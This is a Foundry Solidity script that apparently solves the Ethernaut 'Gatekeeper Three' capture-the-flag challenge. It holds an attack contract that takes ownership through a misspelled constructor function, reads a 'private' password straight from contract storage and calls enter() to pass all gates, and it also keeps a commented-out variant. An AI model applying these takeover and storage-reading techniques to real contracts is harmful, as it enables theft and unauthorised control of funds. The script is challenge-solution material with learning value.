// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";  // Import the GatekeeperThree contract
import "forge-std/Script.sol";  // Foundry's scripting utilities
import "../lib/forge-std/src/console.sol";

// Main script to solve the Gatekeeper Three challenge
contract GatekeeperThreeSolution is Script {

    // Replace with the actual challenge instance address
    address payable public instanceAddress = payable(0xda9113a301dF1b223cad079D627bbBF7209e1fFA); 

    GatekeeperThree public gatekeeper;
    AttackContract public attacker;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));  // Start broadcasting transactions

        //Initialize the GatekeeperThree instance and attacker contract
        gatekeeper = GatekeeperThree(instanceAddress);
        
        attacker = new AttackContract(instanceAddress);
        // attacker.solve((instanceAddress));

        // Send ether to the GatekeeperThree contract to ensure balance > 0.001 ether
        // bool success = instanceAddress.send(0.0011 ether);
        // require(success, "Ether transfer failed");

        //Create the SimpleTrick contract and retrieve the stored password
        gatekeeper.createTrick();
        bytes32 password = vm.load(address(gatekeeper.trick()), bytes32(uint256(2)));

        //Call getAllowance with the correct password to pass gateTwo
        console.logBytes32(password);
        console.log(uint256(password));
        gatekeeper.getAllowance(uint256(password));
        require(address(attacker)==gatekeeper.owner(),"owner not set");
        console.log("attacker",address(attacker));
        console.log("owner",gatekeeper.owner());
        require(gatekeeper.allowEntrance()==true,"entrance not allowed");
        console.log(gatekeeper.allowEntrance());
        require(address(gatekeeper).balance>0.001 ether,"ether not sent");
        console.log(address(gatekeeper).balance);
        // require(payable(address(attacker)).send(0.001 ether) == false,"its not reverting");

        //Execute the attack by calling enter() via the attacker contract
        attacker.enterGate();
        console.log(gatekeeper.entrant());

        vm.stopBroadcast();  // Stop broadcasting transactions
    }
}

// Attacker contract to interact with the GatekeeperThree contract
// contract AttackContract {
//     constructor() payable {}

//      function solve(address _gatekeeper) external {
//        GatekeeperThree gatekeeper = GatekeeperThree(payable(_gatekeeper));

//        // Solve gateOne
//        gatekeeper.construct0r(); // Sets owner to this contract

//        // Solve gateTwo
//        gatekeeper.createTrick();
//        gatekeeper.getAllowance(block.timestamp); // Sets allow_enterance to true

//        // Solve gateThree
//        // Forwards this contract's balance to gatekeeper. Must be at least 0.001 ETH
//        (bool success, ) = payable(address(gatekeeper)).call{
//            value: address(this).balance
//        }("");
//        require(success, "Transfer failed.");

//        // Completes the problem
//        gatekeeper.enter();
//    }
// }

contract AttackContract {

    GatekeeperThree enter;

    constructor(address gate) {
        enter = GatekeeperThree(payable(gate));
        enter.construct0r();
    
    }
   
    function enterGate() public {
            enter.enter();
    }
 }